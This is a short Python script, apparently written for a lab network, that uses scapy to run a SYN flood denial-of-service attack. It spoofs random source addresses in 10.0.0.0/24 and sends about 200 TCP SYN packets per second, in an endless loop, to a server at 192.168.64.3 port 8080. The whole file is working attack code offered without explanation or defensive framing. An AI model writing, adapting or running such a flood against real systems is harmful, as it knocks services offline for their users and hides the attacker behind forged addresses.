from scapy.all import IP, TCP, send
import random
import time

SERVER_IP = "192.168.64.3"
SERVER_PORT = 8080

def syn_flood():
    while True:
        # Spoofed IP in 10.0.0.0/24
        spoofed_ip = f"10.0.0.{random.randint(0, 255)}"
        src_port = random.randint(1024, 65535)
        
        # Craft SYN packet
        ip = IP(src=spoofed_ip, dst=SERVER_IP)
        tcp = TCP(sport=src_port, dport=SERVER_PORT, flags="S")
        packet = ip / tcp
        
        # Send packet
        send(packet, verbose=0)
        time.sleep(0.005)  # 5ms delay, 200 SYNs/sec

if __name__ == "__main__":
    print("Starting SYN flood attack...")
    syn_flood()